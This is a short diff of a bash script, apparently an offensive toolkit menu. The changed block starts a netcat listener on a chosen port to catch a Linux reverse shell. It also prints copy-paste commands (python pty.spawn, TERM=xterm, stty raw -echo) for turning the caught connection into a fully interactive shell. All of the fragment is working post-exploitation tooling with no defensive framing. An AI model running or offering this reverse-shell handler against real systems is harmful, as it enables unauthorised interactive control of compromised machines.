@@ -1343,8 +1343,10 @@ while true; do
 		read -p "digit a number of port for the remote Linux Reverse Shell: " PORTA
 		if [[ "$PORTA" =~ ^[0-9]+$ ]];
 		then
-			echo "python -c 'import pty; pty.spawn(\"/bin/bash\")'"
-			echo "after connection to remote host, in this machine use CTRL+z and digit 'stty raw -echo'"
+			echo "In remote shell, paste these two commands"
+			echo "[COPY+PASTE] python -c 'import pty; pty.spawn(\"/bin/bash\")'"
+			echo "[COPY+PASTE] TERM=xterm"
+			echo "After connection to remote host, in this machine use CTRL+z and digit 'stty raw -echo'"
 			nc -lvnp $PORTA
 		fi
 	;;
